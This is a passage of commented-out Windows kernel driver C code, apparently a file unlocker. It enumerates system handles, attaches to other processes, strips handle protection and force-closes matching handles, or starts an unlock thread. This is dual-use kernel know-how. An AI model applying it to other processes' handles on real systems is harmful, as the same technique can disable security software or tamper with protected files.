													if (RtlEqualUnicodeString(ObjectNameInfo1, ObjectNameInfo2, TRUE))
													{
														PEPROCESS Process = NULL;
														KAPC_STATE ApcState;
														HANDLE ProcessId = HandleInformation2->Handles[i].UniqueProcessId;
														HANDLE ObjectHandle = HandleInformation2->Handles[i].HandleValue;
														OBJECT_HANDLE_FLAG_INFORMATION Ohfi;
														if (ProcessId != 0 && ProcessId != 4 && ProcessId != 8)
														{
															status = PsLookupProcessByProcessId(ProcessId, &Process);
															if (NT_SUCCESS(status))
															{
																KeStackAttachProcess(Process, &ApcState);
																CmpSetHandleProtection(&Ohfi, FALSE);
																ZwClose(ObjectHandle);
																KeUnstackDetachProcess(&ApcState);
																if (Process)
																{
																	ObDereferenceObject(Process);
																	Process = NULL;
																}
															}
														}
													}
													else
													{
														HANDLE ThreadHandle = DecodeKernelHandle(HandleInformation2->Handles[i].HandleValue);
														PsCreateSystemThread(&ThreadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, UnlockFileThread, ThreadHandle);
														ZwWaitForSingleObject(ThreadHandle, FALSE, NULL);
														ZwClose(ThreadHandle);
													}
												}
												__finally
												{
												}
											}
										}
									}
								}
							}


							if (TargetProcessHandle)
							{
								ZwClose(TargetProcessHandle);
								TargetProcessHandle = 0;
							}
							if (CurrentProcessHandle)
							{
								ZwClose(CurrentProcessHandle);
								CurrentProcessHandle = 0;
							}
							if (TargetHandle)
							{
								ZwClose(TargetHandle);
								TargetHandle = 0;
							}
							if (TargetFileObject)
							{
								ObfDereferenceObject(TargetFileObject);
								TargetFileObject = 0;
							}
						}
					}
				}
			}
		}
		if (Buffer)
			ExFreePool(Buffer);
		if (ObjectNameInfo1)
			ExFreePool(ObjectNameInfo1);
		if (ObjectNameInfo2)
			ExFreePool(ObjectNameInfo2);
	}
}*/